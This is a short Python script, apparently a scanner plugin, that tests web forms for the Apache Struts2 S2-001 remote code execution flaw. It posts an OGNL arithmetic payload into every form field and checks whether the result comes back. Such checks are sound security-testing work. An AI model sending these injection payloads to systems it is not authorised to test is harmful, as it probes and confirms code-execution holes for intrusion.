import requests
import re
import urllib

def verify(url):
    relsult = {
        'name': 'S2-001 Remote Code Execution Vulnerability',
        'vulnerable': False
    }
    try:
        s = requests.Session()
        response = s.get(url, timeout=3)
        forms = re.findall(r'<form.+?</form>', response.text, re.DOTALL)
        for form in forms:
            action = re.findall(r'action="([^"]*)"', form)[0]
            vulurl = urllib.parse.urljoin(url, action)
            inputs = re.findall(r'<input.*>', form)
            first = True
            payload = ''
            for input in inputs:
                try:
                    p = re.findall(r'name=[\'\"]([^\'\"]+)[\'\"]', input)[0]
                    if first:
                        payload += p + '={0}'
                        first = False
                    else:
                        payload += '&' + p + '={0}'
                except:
                    continue
            payload = payload.format('%25{43210*40123}')
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            req = s.post(vulurl, data=payload, headers=headers, timeout=3)
            if re.search(r'1733714830', req.text):
                relsult['vulnerable'] = True
                relsult['method'] = 'POST'
                relsult['url'] = vulurl
                relsult['position'] = 'data'
                relsult['payload'] = payload
        return relsult
    except:
        return relsult





